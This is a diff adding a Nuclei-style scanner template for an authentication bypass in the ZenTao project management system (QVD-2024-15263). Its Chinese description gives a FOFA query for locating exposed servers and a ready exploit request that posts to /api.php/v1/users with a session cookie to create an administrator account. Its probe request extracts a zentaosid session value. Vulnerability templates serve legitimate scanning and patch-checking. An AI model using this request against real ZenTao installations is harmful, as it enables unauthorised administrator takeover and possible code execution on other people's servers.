@@ -1,0 +1,30 @@
+id: zentao-pms-auth-bypass
+
+info:
+  name: "禅道 身份验证流程缺陷"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: app="易软天创-禅道系统"
+      禅道项目管理软件是国产开源项目管理平台，提供需求管理、任务管理、缺陷跟踪等全生命周期管理功能。该系统存在身份验证流程缺陷，攻击者可通过操控zentaosid会话标识绕过多因素身份验证流程，实现未授权管理员账户创建及后台控制权获取，后续可能结合其他组件漏洞达成远程代码执行。该漏洞具有较高风险等级，建议立即进行安全加固。
+      利用方式示例：
+      
+      POST /api.php/v1/users HTTP/1.1
+      Cookie: zentaosid=06cc7df8420574cf12a403d16cf3f5d9;
+      
+      {"account": "NdayPoc", "password": "NdayPoc123", "realname": "xiaoming", "role": "top", "group": "1"}
+  reference:
+  - QVD-2024-15263
+  tags: 禅道
+
+http:
+- raw:
+  - |
+    GET /zentao/api.php?m=testcase&f=savexmindimport&HTTP_X_REQUESTED_WITH=XMLHttpRequest&productID=upkbbehwgfscwizoglpw&branch=zqbcsfncxlpopmrvchsu HTTP/1.1
+    Host: {{Hostname}}
+  matchers-condition: and
+  matchers:
+  - type: word
+    part: body
+    words:
+    - 'zentaosid'
